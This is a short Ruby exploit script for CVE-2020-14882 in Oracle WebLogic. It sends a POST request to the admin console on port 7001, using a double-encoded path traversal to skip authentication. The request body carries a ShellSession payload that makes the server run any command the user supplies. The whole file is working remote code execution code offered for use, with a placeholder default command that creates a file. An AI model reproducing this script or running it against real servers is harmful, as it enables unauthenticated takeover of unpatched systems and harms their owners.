#!/usr/bin/env ruby 
# CVE-2020â€“14882 Weblogic 
# tested against fmw_14.1.1.0.0_wls_lite_Disk1_1of1.zip && jdk-8u271-linux-x64.rpm
require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || "touch lalo.txt"

def usage
 puts "[*] #{$0} <host> <cmd>"
 exit
end

usage if ARGV.size < 1

begin
sock = Rex::Proto::Http::Client.new(host, 
                                    port = "7001", 
                                    context = {}, 
                                    ssl = false)

data = "_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27#{cmd}%27);%22)"

req = sock.request_cgi(
      {
        'uri'   => '/console/images/%252E%252E%252Fconsole.portal', 
        'version' => '1.1',
        'method' => 'POST',
        'data' => data,
        'headers' => 
            {
               'Upgrade-Insecure-Requests' => '1',
               'Accept-Encoding' => 'gzip, deflate',
               'Accept-Language' => 'zh-CN, zh;q=0.9',
               'Connection' => 'close',
            },
      })

sock.send_request(req)
data = sock.read_response()
rescue => e
puts "[!] #{e.to_s}"
end
